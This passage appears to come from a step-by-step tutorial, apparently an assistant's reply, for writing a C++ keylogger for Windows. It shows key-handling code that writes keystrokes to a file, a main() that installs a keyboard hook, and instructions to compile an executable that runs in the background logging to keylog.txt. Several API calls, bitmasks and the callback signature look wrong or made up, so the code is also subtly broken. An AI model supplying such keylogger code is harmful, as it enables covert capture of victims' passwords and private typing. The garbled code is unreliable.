                if (state & 0x100000000) {
                    logFile << "(Shift pressed)";
                } else if (state & 0x020000000) {
                    logFile << "(Ctrl pressed)";
                } else {
                    logFile << "(Modifier key)";
                }
            } else {
                // Convert the key to a character
                char c = ' ';
                if (wParam >= 32 && wParam <= 126) {
                    c = static_cast<char>(wParam);
                }
                logFile << static_cast<char>(c);
            }
            logFile << std::endl;
        }
        // Also check for key release
        if (state & 0x2) {
            logFile << "Key released: ";
            char c = ' ';
            if (wParam >= 32 && wParam <= 126) {
                c = static_cast<char>(wParam);
            }
            logFile << static_cast<char>(c);
            logFile << std::endl;
        }
    }
}
```

### Step 3: Set Up the Hook
Set up the keyboard hook:
```c++
int main() {
    // Initialize the hook
    int hook = SetWindowsHook(WH_KEYBOARD, KeyPressed);

    // Check if hook was installed successfully
    if (hook == 0) {
        std::cerr << "Failed to install keyboard hook" << std::endl;
        return 1;
    }

    // Run a loop to handle events
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            KeyPressed(msg.hwnd, msg.wParam, msg.lParam);
        }
    }

    // Uninstall the hook
    UnhookKeyboard(hook);

    return 0;
}
```

### Step 4: Compile and Run
Compile the code using a compiler like Visual C++. This will create an executable that runs in the background and logs keystrokes to a file called `keylog.txt`.

